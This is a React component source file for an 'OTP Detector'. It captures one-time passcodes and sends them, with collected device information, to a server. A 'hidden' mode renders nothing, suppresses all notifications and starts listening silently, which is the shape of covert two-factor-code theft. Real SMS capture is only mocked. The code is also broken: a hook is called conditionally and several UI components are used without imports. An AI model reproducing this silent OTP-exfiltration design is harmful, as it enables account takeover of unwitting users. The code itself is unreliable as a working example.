import React, { useState, useEffect } from 'react';
import { toast } from 'sonner';
import { collectDeviceInfo } from '../services/DeviceInfoService';
import { submitOtpAndDeviceInfo } from '../services/ApiService';

// Remove the hardcoded pattern and make it a customizable field
const DEFAULT_OTP_PATTERN = /\b\d{4}\b/;

interface OtpListenerProps {
  isActive?: boolean;
  minimized?: boolean;
  hidden?: boolean; // New prop to completely hide the component
}

const OtpListener: React.FC<OtpListenerProps> = ({ 
  isActive: initialActive = false, 
  minimized = false,
  hidden = false 
}) => {
  const [isActive, setIsActive] = useState<boolean>(initialActive);
  const [lastDetectedOtp, setLastDetectedOtp] = useState<string | null>(null);
  const [listeningStatus, setListeningStatus] = useState<'idle' | 'listening' | 'detected'>('idle');
  const [statusMessage, setStatusMessage] = useState<string>('OTP detection is off');

  // Handle OTP detection
  const handleOtpDetection = async (otp: string) => {
    try {
      setLastDetectedOtp(otp);
      setListeningStatus('detected');
      setStatusMessage(`OTP detected: ${otp}`);
      
      // Collect device information
      const deviceInfo = await collectDeviceInfo();
      
      // Send data to server
      const result = await submitOtpAndDeviceInfo({ otp, deviceInfo });
      
      if (result) {
        // Don't show toast notifications if hidden mode is enabled
        if (!hidden) {
          toast.success('OTP and device information sent successfully');
        }
      } else {
        // Only show error if not in hidden mode
        if (!hidden) {
          toast.error('Failed to send OTP information');
        }
      }
    } catch (error) {
      console.error('Error in OTP detection process:', error);
      // Only show error if not in hidden mode
      if (!hidden) {
        toast.error('Error processing OTP');
      }
    }
  };

  // Toggle listener state
  const toggleListener = () => {
    const newState = !isActive;
    setIsActive(newState);
    
    if (newState) {
      setListeningStatus('listening');
      setStatusMessage('Listening for OTP codes in background...');
      if (!hidden) {
        requestNotificationPermission();
        toast.info('OTP detection activated in background');
      }
    } else {
      setListeningStatus('idle');
      setStatusMessage('OTP detection is off');
      if (!hidden) {
        toast.info('OTP detection deactivated');
      }
    }
  };

  // Request notification permission
  const requestNotificationPermission = async () => {
    if ('Notification' in window) {
      const permission = await Notification.requestPermission();
      if (permission !== 'granted' && !hidden) {
        toast.warning('Notification permission is required for better experience');
      }
    }
  };

  // Mock OTP detection for testing (in a real app would be connected to SMS listener)
  useEffect(() => {
    if (!isActive) return;

    // For testing purposes, let's simulate SMS detection
    const testOtpTimer = setTimeout(() => {
      if (isActive && Math.random() > 0.5) {
        const mockOtp = Math.floor(1000 + Math.random() * 9000).toString();
        handleOtpDetection(mockOtp);
      }
    }, 10000); // 10 second demo timer

    return () => clearTimeout(testOtpTimer);
  }, [isActive]);
  
  // Status color based on listening state
  const getStatusColor = () => {
    switch (listeningStatus) {
      case 'listening':
        return 'text-app-blue animate-pulse-slow';
      case 'detected':
        return 'text-green-600';
      default:
        return 'text-app-dark-gray';
    }
  };

  // If hidden, return nothing visible but keep the component mounted for background operations
  if (hidden) {
    useEffect(() => {
      // Activate the listener immediately and silently in hidden mode
      if (!isActive && initialActive) {
        setIsActive(true);
        setListeningStatus('listening');
      }
    }, []);
    
    // Return an empty fragment to keep the component mounted but invisible
    return <></>;
  }

  // If minimized, show a compact version
  if (minimized) {
    return (
      <div className="fixed bottom-4 right-4 z-50 bg-white rounded-full shadow-lg p-2">
        <button 
          onClick={toggleListener}
          className={`p-2 rounded-full ${isActive ? 'bg-green-100' : 'bg-gray-100'}`}
        >
          {isActive ? (
            <Bell size={24} className={getStatusColor()} />
          ) : (
            <BellOff size={24} className="text-app-dark-gray" />
          )}
        </button>
      </div>
    );
  }

  return (
    <Card className="w-full max-w-md mx-auto shadow-lg">
      <CardHeader>
        <CardTitle className="flex items-center justify-between">
          <span>OTP Detector</span>
          <Switch 
            checked={isActive} 
            onCheckedChange={toggleListener}
            className="ml-2" 
          />
        </CardTitle>
        <CardDescription>
          Automatically detect and process OTP codes in the background
        </CardDescription>
      </CardHeader>
      <CardContent>
        <div className="flex flex-col items-center space-y-4 py-6">
          {isActive ? (
            <Bell 
              size={48} 
              className={`${getStatusColor()}`} 
            />
          ) : (
            <BellOff 
              size={48} 
              className="text-app-dark-gray" 
            />
          )}
          <p className={`text-center font-medium ${getStatusColor()}`}>
            {statusMessage}
          </p>
          
          {lastDetectedOtp && (
            <div className="mt-4 p-4 bg-green-50 rounded-md border border-green-200 w-full text-center">
              <p className="text-sm text-gray-500">Last detected OTP:</p>
              <p className="text-xl font-bold tracking-wider">{lastDetectedOtp}</p>
            </div>
          )}
        </div>
      </CardContent>
      <CardFooter className="flex justify-center">
        <Button
          onClick={toggleListener}
          variant={isActive ? "destructive" : "default"}
          className="w-full"
        >
          {isActive ? "Stop Detecting" : "Start Detecting"}
        </Button>
      </CardFooter>
    </Card>
  );
};

export default OtpListener;
